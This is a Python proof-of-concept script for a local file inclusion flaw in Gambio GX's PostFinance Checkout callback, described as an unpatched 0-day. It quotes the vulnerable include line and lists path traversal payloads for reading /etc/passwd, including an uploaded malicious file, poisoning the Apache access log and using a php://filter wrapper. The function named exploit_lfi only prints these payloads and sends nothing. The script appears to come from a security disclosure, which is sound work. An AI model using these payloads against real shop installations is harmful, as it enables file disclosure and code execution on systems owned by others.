#!/usr/bin/env python3
"""
Proof of Concept: Local File Inclusion in Gambio GX
Vulnerability: callback/swixpostfinancecheckout/callback.php (Line 44)

This PoC demonstrates the LFI vulnerability where the 'payment_class' 
from transaction metadata is used directly in include_once() without validation.

DISCLAIMER: This script is for authorized security testing only.
"""

import requests
import argparse
import os
from urllib.parse import urljoin

def get_basename(path):
    """Extract basename from a file path"""
    return os.path.basename(path)

def exploit_lfi(target_url, payload_class, space_id="12345"):
    """
    Exploit the Local File Inclusion vulnerability.
    
    The vulnerability exists because:
    - Line 44: include_once(DIR_FS_CATALOG . 'includes/modules/payment/' . $metaData['payment_class'] . '.php')
    - The payment_class comes from transaction metadata without validation
    - Path traversal sequences allow including arbitrary files
    
    Args:
        target_url: Base URL of the Gambio installation
        payload_class: The path traversal payload (e.g., "../../../etc/passwd")
        space_id: The spaceId to use (must match configured value)
    """
    
    callback_endpoint = urljoin(target_url.rstrip('/') + '/', 'callback/swixpostfinancecheckout/callback.php')
    
    # The vulnerability requires controlling transaction metadata via PostfinanceCheckout API
    # This payload structure shows the attack vector
    payload = {
        "listenerEntityId": "1472041829003",  # Hardcoded check in source
        "entityId": "TRANSACTION_ID",          # Used to fetch transaction
        "spaceId": space_id                    # Must match configured value
    }
    
    print(f"[*] Target: {callback_endpoint}")
    print(f"[*] Payload class: {payload_class}")
    print(f"[*] Basename: {get_basename(payload_class)}")
    
    # Note: Actual exploitation requires control over PostfinanceCheckout transaction metadata
    # The metaData['payment_class'] must be set to the traversal payload
    
    # Example traversal payloads:
    traversal_examples = [
        "../../../etc/passwd",                    # Read /etc/passwd (without .php extension)
        "../../../../tmp/malicious",              # Include uploaded malicious file
        "../../../var/log/apache2/access.log",   # Log poisoning attack
        "php://filter/convert.base64-encode/resource=../../../etc/passwd"  # PHP wrapper
    ]
    
    print("\n[*] Example traversal payloads:")
    for i, example in enumerate(traversal_examples, 1):
        print(f"    {i}. {example}")
        print(f"       Basename: {get_basename(example)}")
    
    print("\n[!] Exploitation requires:")
    print("    1. Control over PostfinanceCheckout transaction metadata")
    print("    2. Valid spaceId matching the shop configuration")
    print("    3. Transaction ID that can be fetched via API")
    
    print("\n[*] Vulnerable code (Line 44):")
    print("    include_once(DIR_FS_CATALOG . 'includes/modules/payment/' . $metaData['payment_class'] . '.php');")
    
    return {
        "endpoint": callback_endpoint,
        "payload": payload,
        "traversal_examples": traversal_examples
    }


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Gambio GX Local File Inclusion vulnerability"
    )
    parser.add_argument(
        "-t", "--target",
        default="http://localhost/gambio/",
        help="Target Gambio URL (default: http://localhost/gambio/)"
    )
    parser.add_argument(
        "-p", "--payload",
        default="../../../etc/passwd",
        help="Path traversal payload (default: ../../../etc/passwd)"
    )
    parser.add_argument(
        "-s", "--space-id",
        default="12345",
        help="PostfinanceCheckout Space ID"
    )
    parser.add_argument(
        "--basename",
        action="store_true",
        help="Just print basename of payload"
    )
    
    args = parser.parse_args()
    
    if args.basename:
        print(f"Basename: {get_basename(args.payload)}")
        return
    
    print("=" * 60)
    print("Gambio GX - Local File Inclusion PoC")
    print("CVE: N/A (0-day)")
    print("CVSS: 9.8 (Critical)")
    print("=" * 60)
    
    result = exploit_lfi(args.target, args.payload, args.space_id)
    
    print("\n" + "=" * 60)
    print("PoC completed. See SECURITY_AUDIT_REPORT.md for full details.")
    print("=" * 60)


if __name__ == "__main__":
    main()
